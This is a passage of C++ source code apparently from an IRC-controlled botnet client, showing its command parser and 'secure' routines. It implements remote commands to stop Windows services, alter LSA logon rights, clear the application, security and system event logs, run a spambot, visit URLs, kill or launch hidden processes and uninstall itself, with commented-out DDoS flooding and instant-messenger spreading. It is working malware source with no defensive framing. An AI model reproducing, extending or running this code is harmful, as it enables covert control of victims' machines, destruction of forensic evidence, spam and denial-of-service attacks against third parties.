	SERVICE_STATUS ssStatus; 
	SC_HANDLE schService;
	SC_HANDLE hServiceControl;
	DWORD fdwAccess; 
	DWORD fdwControl;
	// The required service object access depends on the control. 
	fdwControl = SERVICE_CONTROL_STOP;
	fdwAccess = SERVICE_STOP;
	int stopped=0;
	int stopsize=(sizeof(stoplist)/sizeof(LPTSTR));

//	char sendbuf[IRCLINE];
	for(int x=0;x<stopsize;x++)
	{
 		// Open a handle to the service.
		hServiceControl=fOpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		schService=fOpenService(hServiceControl,stoplist[x],SERVICE_ALL_ACCESS);
		if (schService == NULL)
		{
			DWORD dw = GetLastError();
			if ((int)dw == 1060)
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s The %s service does not exist.",sec_title,stopnames[x]);
		}
		else
		{ 
			if (fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
			{
				fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus);
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s %s service stopped.",sec_title,stopnames[x]);
				stopped++;
			}
			else
			{
				DWORD dw = GetLastError();
				if ((int)dw == 1062)
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s The %s service was not started.",sec_title,stopnames[x]);

				else
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s Failed to stop the %s service, error: <%d> %u",sec_title,stopnames[x],dw);
			}
		}
		fCloseServiceHandle(schService);
		fCloseServiceHandle(hServiceControl);
	}
	if (stopped==0)
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s No services stopped.",sec_title);
	}
	else
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s Total services stopped: %d",sec_title,stopped);
	}
}


DWORD WINAPI SecureThread(LPVOID param)
{
	NTHREAD secure = *((NTHREAD*)param);
	NTHREAD *secures = (NTHREAD *)param;
	secures->gotinfo = TRUE;
	
	if (secure.bdata2) //loop
	{
		while (1)
		{
			if (!noadvapi32)
			{
				SecureServices(NULL, 0, TRUE, FALSE, TRUE);
				SecureRegistry(TRUE, NULL, 0, TRUE, FALSE, TRUE);
				SecureShares(TRUE, NULL, 0, TRUE, FALSE, TRUE);

#ifndef NO_LSARESTRICT
				if (!noadvapi32lsa)
					SearchForPrivilegedAccounts(L"SeNetworkLogonRight",FALSE);
#endif
			}
			//WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
			Sleep(SECURE_DELAY);
		}
	}
	else
	{
		IRC* irc=(IRC*)secure.conn;
		if (!noadvapi32)
		{
			if (secure.bdata1)
				SecureServices(irc,secure.target,secure.silent,secure.verbose,FALSE);
			
#ifndef NO_LSARESTRICT
			if (!noadvapi32lsa) {
				DWORD dwRet;
				if ((dwRet = SearchForPrivilegedAccounts(L"SeNetworkLogonRight",(secure.bdata1?FALSE:TRUE))) > 0)
				{
					if(!secure.silent && !secure.bdata1)
						irc->privmsg(secure.target,"%s %s SeNetworkLogonRights %s %d accounts in local system policy.", (secure.bdata1?sec_title:unsec_title), (secure.bdata1?"Removed":"Added"), (secure.bdata1?"from":"to"),dwRet);
				}
				else if(!secure.silent && !secure.bdata1)
					irc->privmsg(secure.target,"%s Failed to %s SeNetworkLogonRights %s accounts in local system policy.",(secure.bdata1?sec_title:unsec_title),(secure.bdata1?"remove":"restore"),(secure.bdata1?"from any":"to"));
			}
#endif

			SecureRegistry(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
			SecureShares(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
		}
			
	}
	clearthread(secure.threadnum);
	ExitThread(0);
}

#ifndef NO_LSARESTRICT

LPWSTR AccountName[]={
	L"Administrators",
	L"Users"
};

void InitLsaString(PLSA_UNICODE_STRING LsaString, LPWSTR String)
{
	DWORD StringLength;

	if (String == NULL) {
		LsaString->Buffer = NULL;
		LsaString->Length = 0;
		LsaString->MaximumLength = 0;

		return;
	}

	StringLength = wcslen(String);
	LsaString->Buffer = String;
	LsaString->Length = (USHORT) StringLength * sizeof(WCHAR);
	LsaString->MaximumLength=(USHORT)(StringLength+1) * sizeof(WCHAR);

	return;
}

NTSTATUS SetPrivilegeOnAccount(LSA_HANDLE PolicyHandle, PSID AccountSid, LPWSTR PrivilegeName, BOOL bEnable)
{
	LSA_UNICODE_STRING PrivilegeString;
	InitLsaString(&PrivilegeString, PrivilegeName);

	return (bEnable)?(fLsaAddAccountRights(PolicyHandle,AccountSid,&PrivilegeString,1))
		:(fLsaRemoveAccountRights(PolicyHandle,AccountSid,FALSE,&PrivilegeString,1));
}

DWORD AddPrivilegeToAccount(LSA_HANDLE PolicyHandle, LPWSTR AccountName, LPWSTR PrivilegeName)
{
	DWORD total = 0;
	PLSA_TRANSLATED_SID2 ltsTranslatedSID2;
	PLSA_REFERENCED_DOMAIN_LIST lrdlDomainList;
	NTSTATUS ntsResult;

	LSA_UNICODE_STRING lucName;
	InitLsaString(&lucName, AccountName);

	if ((ntsResult = fLsaLookupNames2(PolicyHandle,0,1,&lucName,&lrdlDomainList,&ltsTranslatedSID2)) == ERROR_SUCCESS) {
		if (SetPrivilegeOnAccount(PolicyHandle,ltsTranslatedSID2->Sid,PrivilegeName, TRUE) == ERROR_SUCCESS)
			total++;
	}
	fLsaFreeMemory(ltsTranslatedSID2);
	fLsaFreeMemory(lrdlDomainList);

	return (total);
}

DWORD SearchForPrivilegedAccounts(LPWSTR PrivilegeName, BOOL bEnable)
{
	DWORD count = 0, total = 0;

	static SECURITY_QUALITY_OF_SERVICE sqos = {sizeof SECURITY_QUALITY_OF_SERVICE, SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
	static LSA_OBJECT_ATTRIBUTES lsaOA = {sizeof LSA_OBJECT_ATTRIBUTES, NULL, NULL, 0, NULL, &sqos};

	LSA_HANDLE PolicyHandle;
	NTSTATUS nts;
		
	if ((nts = fLsaOpenPolicy(NULL, &lsaOA, GENERIC_ALL | POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &PolicyHandle)) == ERROR_SUCCESS) {

		if (bEnable) {
			for (DWORD i=0; i < sizeof(AccountName) / sizeof(LPWSTR); i++)
				total += AddPrivilegeToAccount(PolicyHandle, AccountName[i],PrivilegeName);
		} else {
			void *buffer;

			LSA_UNICODE_STRING PrivilegeString;
			InitLsaString(&PrivilegeString, PrivilegeName);

			if ((nts = fLsaEnumerateAccountsWithUserRight(PolicyHandle, &PrivilegeString, &buffer, &count)) == ERROR_SUCCESS) {
				SID **psidArray = (SID **)buffer;
				for (DWORD i = 0; i < count; ++ i) {
					if (SetPrivilegeOnAccount(PolicyHandle, psidArray[i], PrivilegeName, FALSE) == ERROR_SUCCESS)
						total++;
				}

				if (buffer) fLsaFreeMemory(buffer);
				buffer = NULL;
			}
		}

		fLsaClose(PolicyHandle);
	}
	return (total);
}

#endif
#endif // NO_SECURE


extern char netinfo_title[];
extern int serversize;

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	int tnum; // for finding the number of a already running thread
	int i;	  // for misc shit
	DWORD id; // for creating new threads
	
	if (topic)
	{
		if (!lstrcmpi(cmd_login_1,a[0]))
			return 1;
		if (!lstrcmpi(cmd_logout_1,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove_1,a[0]))
			return 1;
	}

	// stops
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,LIST_THREAD,"Thread list");
			return 1;
		}
		
#ifndef NO_PROCESS
		else if (!lstrcmpi(cmd_process_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PROC_THREAD,"Process");
			return 1;
		}
#endif

#ifndef NO_SECURE
		else if (!lstrcmpi(cmd_secure_1,a[0]) || !lstrcmpi(cmd_unsecure_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SECURE_THREAD,"Secure");
			return 1;
		}
#endif

#ifndef NO_ADVSCAN
		else if (!lstrcmpi(cmd_scanall_1,a[0]) || !lstrcmpi(cmd_advscan_1,a[0]) || !lstrcmpi(cmd_banscan_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SCAN_THREAD,"Scanner");
			return 1;
		}
#endif



#ifndef NO_SPAMBOT
		else if (!lstrcmpi(cmd_spambot_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SPAMBOT_THREAD,"Spambot");
			return 1;
		}
#endif

#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"Protected Storage");
			return 1;
		}
#endif
		
#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(cmd_download_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(cmd_update_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif



/*#ifndef NO_DDOS
		else if (!lstrcmpi(cmd_ddos_1,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DDOS_THREAD,"DD0S thread");
			return 1;
		}
#endif*/

}
    //////////////////////////////////////////////////////////////////////////////
	//								Login
	//			At this point the user should already be logged in
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],cmd_login_1))
	{
		if (switches.verbose)
			irc->privmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}

#ifdef _DEBUG
	//////////////////////////////////////////////////////////////////////////////
	//								Encrypt
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],cmd_encrypt_1))
	{
		char *cmd=strchr(params,' ');
		if (cmd)
		{
			cmd++;//remove the space
    		char buffer[IRCLINE];
			unsigned int counter=0;
			ZeroMemory(buffer,sizeof(buffer));
            unsigned int str_len = strlen(cmd);
		    			
			Crypt((unsigned char *)cmd, strlen(cmd), NULL, 0);
			sprintf(buffer,"%s Cipher text: \"",main_title);
			for (unsigned int i=0; i < str_len; i++) {
				char tmpbuf[12];
				_snprintf(tmpbuf,sizeof(tmpbuf),"\\x%2.2X", (unsigned char)cmd[i]);
				counter+=strlen(tmpbuf);
				if (counter >= (IRCLINE-20)) {
					irc->privmsg(hostd->target,buffer);
					ZeroMemory(buffer,sizeof(buffer));	
					counter = 0;
				} 
				strncat(buffer,tmpbuf,strlen(tmpbuf));
			}
			strcat(buffer,"\";");
			Crypt((unsigned char *)cmd, strlen(cmd), NULL, 0);
			strcat(buffer," .»». Crypt check: \"");
			strncat(buffer,cmd,strlen(cmd));
			strcat(buffer,"\"");
			irc->privmsg(hostd->target,buffer);
		}
		return 1;
	}
#endif // NO_ENCRYPT
    //////////////////////////////////////////////////////////////////////////////
	//								Servers
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(cmd_server_1, a[0]))
	{
		if (!a[1])
		{
			irc->privmsg(hostd->target,"%s: Current Server: %i: %s:%d%s",main_title,curserver,servers[curserver].host,servers[curserver].port,(servers[curserver].usessl?" (SSL)":""));
		}
		else if (!lstrcmpi(a[1],"l"))
		{
			irc->privmsg(hostd->target,"%s Server List:", main_title);
			for (int s=0;s<serversize;s++)
			{
				irc->privmsg(hostd->target,"%i: %s:%d%s, %s",s,servers[s].host,servers[s].port,(servers[s].usessl?" (SSL)":""),servers[s].chan);
			}
			irc->privmsg(hostd->target,"%s Server List complete.", main_title);
		}
		else if (!lstrcmpi(a[1],"j"))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,main_title);
				return 1;
			}
			if (atoi(a[2])<0 || atoi(a[2])>=serversize)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Invalid server.",main_title);
				return 1;
			}
			curserver=atoi(a[2])-1;//-1 for the ++ when it gets disconnected
			irc->quit("Changing servers");
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Logout
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(cmd_logout_1, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Who
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_who,a[0]))
	{
		irc->list_logins(hostd->target);
		return 1;
	}


	/*//////////////////////////////////////////////////////////////////////////////
	//							  IM Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_AIM
	else if (!lstrcmpi("aim",a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,"DEBUG//");
			return 1;
		}
		
		int Aen = 1;
		strcpy(AIMmesg, "");
		while (a[Aen]) {
			sprintf(AIMmesg, "%s %s", AIMmesg, a[Aen]);
			Aen++;
		}
		
		EnumWindows(EnumYahoo, 0);
		EnumWindows(EnumMSN, 0);
		EnumWindows(EnumAIM, 0);
				
		if(!switches.silent)
			irc->privmsg(hostd->target,"%s Spreading URL into Instant Messengers.", aim_title);
				
		return 1;
	}
#endif
*/
	//////////////////////////////////////////////////////////////////////////////
	//								Remove
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_remove_1))
	{
#ifndef NO_SECURE
		
		if(!switches.silent)
			irc->privmsg(hostd->target,"%s Unsecuring Bot...", unsec_title);
		
		NTHREAD secure;		
		secure.silent=TRUE;
		secure.verbose=FALSE;
		strcpy(secure.target,hostd->target);
		secure.conn=irc;
		secure.bdata1=FALSE;//secure
		secure.bdata2=FALSE;//loop
		
		secure.threadnum=addthread(SECURE_THREAD,"%s %s.",unsec_title,"Unsecure");
		if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id))
		{
			while (secure.gotinfo == FALSE)
				Sleep(50);
		}
#endif
		Sleep(5000);
			
		if(!switches.silent)
			irc->privmsg(hostd->target,"%s Removing Bot...", main_title);
		
		uninstall();
		
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}


	//////////////////////////////////////////////////////////////////////////////
	//								TestDLLs
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DLLTEST
	else if (!lstrcmpi(a[0],cmd_testdlls))
	{
		CheckDLLs(hostd->target,irc);
		return 1;
	}
#endif // NO_DLLTEST


	//////////////////////////////////////////////////////////////////////////////
	//							Clear event logs
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_CEL
	else if (!lstrcmpi(a[0],cmd_cel))
	{
		if (!noadvapi32)
		{
			HANDLE hEventLog;
			OSVERSIONINFO OSVersionInfo;
			ZeroMemory(&OSVersionInfo, sizeof(OSVERSIONINFO));
			OSVersionInfo.dwOSVersionInfoSize = sizeof(OSVersionInfo);
			GetVersionEx((LPOSVERSIONINFO) &OSVersionInfo);
			char *applogs[]={"application","security","system"};
			int total=(sizeof(applogs)/sizeof(LPTSTR));
			int success=0;
			if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
			{
				for (int i=0;i<total;i++)
				{
					hEventLog=fOpenEventLog(NULL,applogs[i]);
					if (hEventLog != NULL)
					{
						if (fClearEventLog(hEventLog,NULL))
							success++;
						fCloseEventLog(hEventLog);
					}
				}
			}
			if (!switches.silent)
			{
				if (success>0)
					irc->privmsg(hostd->target,"%s Cleared %d/%d event logs.",main_title,success,total);
				else
					irc->privmsg(hostd->target,"%s Failed to clear event logs.",main_title);
			}
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_noadvapi,main_title);
		}

		return 1;
	}
#endif

	
	//////////////////////////////////////////////////////////////////////////////
	//								Threads
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_threads_1,a[0]))
	{
		if (a[1])
		{
			if (!lstrcmpi(cmd_threads_kill_1,a[1]))
			{
				if (a[2])
				{
					if (!lstrcmpi(cmd_all,a[2]))
					{
						if ((i=killthreadall()) > 0)
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_stop,threads_title,i);
						}
						else
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_ac,threads_title);
						}
					}
					else
					{
						if (killthread(atoi(a[2])))
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_kill,threads_title,a[2]);
						}
						else 
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_fkill,threads_title,a[2]);
						}
					}
				}
				return 1;
			}
		}
		if ((tnum=findthreadnum(LIST_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,threads_title,"Thread listing",tnum);
			return 1;
		}

		NTHREAD tlist;
		tlist.silent=switches.silent;
		tlist.verbose=switches.verbose;
		strcpy(tlist.target,hostd->target);
		tlist.conn=irc;
		tlist.bdata1 = ((a[1])?((!lstrcmpi(a[1],cmd_threads_sub))?(TRUE):(FALSE)):(FALSE)); // full list

		tlist.threadnum=addthread(LIST_THREAD,"%s Thread listing.",threads_title);
		if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
			while (tlist.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,threads_title,"Thread listing",GetLastError());
		}
		return 1;
	}



#ifndef NO_SPAMBOT
	//////////////////////////////////////////////////////////////////////////////
	//								Spambot
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_spambot_1,a[0]))
	{
		if ((tnum=findthreadnum(SPAMBOT_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,spambot_title,"Spambot",tnum);
			return 1;
		}
		
		NTHREAD spambot;
		spambot.silent=switches.silent;
		spambot.verbose=switches.verbose;
		strcpy(spambot.target,hostd->target);
		spambot.conn=irc;
		
		spambot.data1 = a[1]; // server
		spambot.idata1 = atoi(a[2]); // port
		
		char Msg[IRCLINE];
        int Aen = 3;

		strcpy(Msg,"");
		while(a[Aen]) {sprintf(Msg, "%s %s", Msg, a[Aen]);Aen++;}
		spambot.data2 = Msg;
		
		spambot.threadnum=addthread(SPAMBOT_THREAD,"%s Spaming on: %s:%i",spambot_title,spambot.data1,spambot.idata1);
		if (threads[spambot.threadnum].tHandle = CreateThread(NULL, 0, &SpamBot, (LPVOID)&spambot, 0, &id)) {
			while (spambot.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Spaming on: %s:%i",spambot_title,spambot.data1,spambot.idata1);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,spambot_title,"Spambot thread",GetLastError());
		}
		return 0;
	}
#endif
	
	

/*
	//////////////////////////////////////////////////////////////////////////////
	//                              DDoS
    //////////////////////////////////////////////////////////////////////////////
#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_1,a[0]))
	{
		if (!a[5])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,"DEBUG//");
			return 1;
		}
		
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,skysyn_title,"DDoS thread",tnum);
			return 1;
		}
		
		NTHREAD tcp;
		tcp.silent=switches.silent;
		tcp.verbose=switches.verbose;
		strcpy(tcp.target,hostd->target);
		tcp.conn=irc;

		tcp.data1 = a[1]; // flood type
		tcp.data2 = a[2]; // victim
		tcp.idata1 = atoi(a[3]); // dest port
		tcp.idata2 = atoi(a[5]); // delay
		tcp.idata3 = atoi(a[4]); // time
				       
		tcp.threadnum=addthread(DDOS_THREAD,"%s Flooding...", skysyn_title);
		
		if (threads[tcp.threadnum].tHandle = CreateThread(NULL, 0, &sdsyn, (LPVOID)&tcp, 0, &id)) {
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Flooding: (%s:%s) with %s packets", skysyn_title, a[1], a[2], a[3]);
			else if(!switches.silent)
				irc->privmsg(hostd->target,"%s Flooding...", skysyn_title);
			while(tcp.gotinfo == FALSE)
				Sleep(50);
		} else {
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,redirect_title,"Skysyn thread",GetLastError());
		}
		
	return 1;
}
#endif
*/
	//////////////////////////////////////////////////////////////////////////////
	//                              Visit
    //////////////////////////////////////////////////////////////////////////////
#ifndef NO_VISIT
	
	else if (!lstrcmpi(cmd_visit_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,"DEBUG//");
			return 1;
		}

		if ((tnum=findthreadnum(VISIT_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,visit_title,"Visit thread",tnum);
			return 1;
		}

		NTHREAD visit;
		visit.silent = switches.silent;
		strcpy(visit.target,hostd->target);
		visit.conn=irc;
		
		visit.data1 = a[1]; // host
		if (a[2] != NULL)
			visit.data2 = a[2]; // referer
		
		visit.threadnum=addthread(VISIT_THREAD,"%s URL: %s", visit_title, a[1]);
		
		if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
			if(!switches.silent)
				irc->privmsg(hostd->target,"%s URL: %s", visit_title, a[1]);
			while(visit.gotinfo == FALSE)
				Sleep(50);
		} else {
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,visit_title,"Visit thread",GetLastError());
		}
		return 1;
	}

#endif
	
	//////////////////////////////////////////////////////////////////////////////
	//								Uptime
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_uptime_1))
	{
		char sendbuf[IRCLINE];	
		sprintf(sendbuf,"%s Uptime: %s",main_title,Uptime(GetTickCount(),0,TRUE));
			
#ifndef NO_RECORD_UPTIME
		if (!noadvapi32)
		{
			bRecUpdated=UpdateRecord();
			if (!bRecUpdated)
			{
				char tempbuf[50];
				_snprintf(tempbuf,sizeof(tempbuf),", Record Uptime: %s.",RecordUptime());
				strcat(sendbuf,tempbuf);
			}
			else
			{
				strcat(sendbuf,", (Record).");
			}
		}
		else
			strcat(sendbuf,".");

		irc->privmsg(hostd->target,sendbuf);
#else
		irc->privmsg(hostd->target,"%s.",sendbuf);
#endif
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//							Installed Time
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_INSTALLED_TIME
	else if (!lstrcmpi(a[0],cmd_insttime_1))
	{
		if (!noadvapi32)
			irc->privmsg(hostd->target,str_installed,main_title,installedt);
		else
			irc->privmsg(hostd->target,str_noadvapi,main_title);

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Version
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_BOTVERSION
	else if (!lstrcmpi(cmd_version_1,a[0]))
	{
		if (a[1])
		{
			if (lstrcmpi(botid,a[1]))
				irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));
		}
		else
			irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Status
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_STATUS
	else if (!lstrcmpi(cmd_status_1, a[0])) {
		DWORD dwgtc=GetTickCount();
		
		char boxup[50],botup[50],serverup[50];
		sprintf(boxup,Uptime(dwgtc,0,TRUE));
		sprintf(botup,Uptime(dwgtc,dwstarted,TRUE));
		sprintf(serverup,Uptime(dwgtc,dwconnected,TRUE));

		if (findthreadid(SCAN_THREAD) > 0)
			irc->privmsg(hostd->target,str_status,main_title,"Scanning",boxup,botup,serverup);
		
		else if (findthreadid(DDOS_THREAD) > 0)
			irc->privmsg(hostd->target,str_status,main_title,"Attacking",boxup,botup,serverup);
			
		else
			irc->privmsg(hostd->target,str_status,main_title,"Idle",boxup,botup,serverup);

		return 1;
	}
#endif // NO_STATUS


	//////////////////////////////////////////////////////////////////////////////
	//							Secure/Unsecure
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SECURE
	else if (!lstrcmpi(cmd_secure_1,a[0])
		|| !lstrcmpi(cmd_unsecure_1,a[0]))
	{
		BOOL bsecure=(!lstrcmpi(cmd_secure_1,a[0]));
		
		if ((tnum=findthreadnum(SECURE_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,sec_title,"Secure thread",tnum);
			return 1;
		}

		NTHREAD secure;		
		secure.silent=switches.silent;
		secure.verbose=switches.verbose;
		strcpy(secure.target,hostd->target);
		secure.conn=irc;
		secure.bdata1=bsecure;//secure
		secure.bdata2=FALSE;//loop
		
		secure.threadnum=addthread(SECURE_THREAD,"%s %s.",(bsecure?sec_title:unsec_title),(bsecure?"Secure":"Unsecure"));
		if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id))
		{
			while (secure.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,(bsecure?sec_title:unsec_title),(bsecure?"Secure thread":"Unsecure thread"),GetLastError());
		}

		return 1;
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//							Process Control
	//					.ps [list]
	//					.ps <kill> <image/pid>
	//					.ps <del> <image/pid>
	//					.ps <create> <fullpathtoexe> [hide]
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
	else if (!lstrcmpi(cmd_process_1,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,process_title);
			return 1;
		}

		NTHREAD process;
		process.silent=switches.silent;
		process.verbose=switches.verbose;
		strcpy(process.target,hostd->target);
		process.bdata1=FALSE; // list
		process.bdata2=FALSE; // kill
		process.bdata3=FALSE; // del
		process.conn=irc;

		if (!lstrcmpi("l",a[1]))
		{
			if ((tnum=findthreadnum(PROC_THREAD)) > 0)
			{
				irc->privmsg(hostd->target,str_thread_alr,process_title,"Process thread",tnum);
				return 1;
			}
			process.bdata1=TRUE;
			a[2]?process.data2=a[2]:process.data2=NULL; // filter
		}
		else if (!lstrcmpi("k",a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE;  // kill
			process.bdata3=FALSE; // del
		}
		else if (!lstrcmpi("d",a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE; // kill
			process.bdata3=TRUE; // del
		}
		else if (!lstrcmpi("c",a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			if (a[3])
				process.bdata1=TRUE;
			if (switches.createwait)
				process.bdata2=TRUE;

			char file[MAX_PATH];
			sprintf(file,a[2]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				int i;
				for (i=0;i<strlen(process.data1);i++)
					if (process.data1[i]==replace)
						process.data1[i]=' ';
			}
			process.data1=file;

			process.threadnum = addthread(PROC_THREAD,"%s Create process thread.",process_title);
			if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &CreateProcThread, (LPVOID)&process, 0, &id))
			{
				while (process.gotinfo == FALSE)
					Sleep(50);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
			}
			return 1;
		}
		else
		{
			return 1;
		}
		process.threadnum = addthread(PROC_THREAD,"%s Process thread.",process_title);
		if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &ProcessThread, (LPVOID)&process, 0, &id))
		{
			while (process.gotinfo == FALSE)
				Sleep(50);
		}
